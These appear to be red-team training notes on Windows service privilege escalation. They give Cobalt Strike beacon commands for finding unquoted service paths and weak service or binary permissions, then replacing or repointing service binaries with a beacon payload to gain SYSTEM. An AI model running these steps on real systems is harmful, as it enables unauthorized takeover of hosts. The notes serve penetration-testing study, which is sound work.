# Windows Services

## Introduction

Windows Services typically start up automatically when a computer boots. Services typically are used to start and manage Windows core functionality (Updates, Firewall, Defender, and more). Third part software also may utilize services to manage when and how they run.

Once a service has been updated, it's likely it will have to be restarted for the changes to take place.

## Enumerating Services

We can use services.msc or the sc command line tool.

### sc - command line

```powershell
C:\>sc query

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Get-Service - Powershell

```powershell
PS C:\> Get-Service | fl

Name                : ALG
DisplayName         : Application Layer Gateway Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

## Unquoted Service Paths

Unqouted service paths can lead to privilege escalation as Windows attempts to read a path, and may interpret the space as a terminator. We of course need write permissions in the directory we're attempting to write.

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

### Enumerating Services - Cobalt Strike

#### wmic

```powershell
beacon> run wmic service get name, pathname

Name                    PathName
ALG                     C:\Windows\System32\alg.exe
AppVClient              C:\Windows\system32\AppVClient.exe
Sense                   "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
[...snip...]
VulnService1            C:\Program Files\Vulnerable Services\Service 1.exe
```

#### Powershell

```powershell
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  CreateFiles, Synchronize
BUILTIN\Users Allow  ReadAndExecute, Synchronize
....
```

#### SharpUp - Unquoted Services

We can use [SharpUp](https://github.com/GhostPack/SharpUp) and Cobalt Strike execute-assembly to enumerate services .

```powershell
beacon> execute-assembly C:\Tools\SharpUp.exe audit UnquotedServicePath

=== SharpUp: Running Privilegrm e Escalation Checks ===

=== Services with Unquoted Paths ===
	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.
```

#### SharpUp - Weak Service Permissions

```powershell
beacon> execute-assembly C:\Tools\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService' (State: Running, StartMode: Auto)
```

### Privilege Escalation - Unquoted Services

Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager. When using the "Generate All Payloads" option, these have svc in the filename. <mark style="color:red;">Note</mark>: It's recommended to use tcp beacons bound to localhost for privilege escalation.

#### Navigate to Vulnerable Path

```powershell
beacon> cd C:\Program Files\Vulnerable Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe

```

#### Upload Payload

```powershell
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
```

#### Restart Service

We'll have to stop and start the service.

```powershell
beacon> run sc stop VulnService
beacon> run sc start VulnService

beacon> connect localhost 4444
```

## Weak Service Permissions

Services may be modifiable by users or groups that will allow us to change it's configuration.

### Enumerating Service Permissions

We can find modifiable services with SharpUp and a [Get-Service](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) Powershell script.

#### SharpUp - Find Modifiable Services

```powershell
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService' (State: Running, StartMode: Auto)
```

#### PowerShell - Get permissions of modifiable service

```powershell
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService | select -expand Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

### Change Service Binary Path

We can exploit this by changing the binary path of the modifiable service to a location that stores our payload.

#### Get Current Service Binary Path

```powershell
beacon> run sc qc VulnService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Upload Binary Payload

```powershell
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
```

#### Configure & Run Service

```powershell
beacon> run sc config VulnService binPath= C:\Temp\tcp-local_x64.svc.exe
[SC] ChangeServiceConfig SUCCESS
```

#### Validate the Service has been updated

```powershell
beacon> run sc qc VulnService

SERVICE_NAME: Vuln-Service-2
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\tcp-local_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

#### Restart Service

We'll have to stop and start the service.

```powershell
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

beacon> connect localhost 4444
```

#### Restore Changes

When we've completed the engagement, we'll want to restore the service to it's initial configuration.

```powershell
beacon> run sc config VulnService binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
[SC] ChangeServiceConfig SUCCESS
```

<mark style="color:red;">Note</mark>: The additional set of quotes (") is necessary to ensure the path remains completely quoted.



## Weak Service Binary Permissions

Simarly to above, instead of the service having weak permissions, the actual binary that the service runs may have weak permissions.

### Enumerate Binary Permissions

```powershell
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services\Service 3.exe
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  Modify, Synchronize
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
```



### Exploit Vulnerability



#### Download Service

We can download the service binary for more details.&#x20;

```powershell
beacon> download Service 3.exe
[*] started download of C:\Program Files\Vuln Services\Service 3.exe (5120 bytes)
[*] download of Service 3.exe is complete
```

#### Upload Payload

Now it's time tp upload our payload. We'll rename the payload to the name of the binary used in the service.

```powershell
PS C:\Attacker\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
```

```powershell
beacon> upload C:\Payloads\Service 3.exe
[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
```

Note: The error ERROR\_SHARING\_VIOLATION means the file is already running. We'll need to stop the service.

```powershell
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
```

